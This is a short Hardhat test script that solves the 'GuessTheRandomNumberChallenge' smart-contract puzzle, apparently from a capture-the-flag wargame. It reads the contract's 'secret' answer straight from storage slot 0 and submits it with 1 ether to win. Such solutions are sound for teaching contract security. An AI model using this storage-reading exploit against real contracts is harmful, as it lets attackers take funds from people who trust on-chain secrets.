import { ethers } from "hardhat";
import { Contract } from "ethers";
import { expect } from "chai";
import { getContract } from "../utiils";

let contract: Contract;

before(async () => {
    contract = await getContract("GuessTheRandomNumberChallenge", "0xB5c4F6844b667584345c8b18c3E3e3d4e05A9Fe2")
});

it("solves the challenge", async function () {
    const answer = parseInt(await contract.provider.getStorageAt(contract.address, 0))

    const tx = await contract.guess(answer, {
        value: ethers.utils.parseEther("1"),
    });

    const txHash = tx && tx.hash
    expect(txHash).to.not.be.undefined

    const isComplete = await contract.isComplete()
    expect(isComplete).to.be.true;
});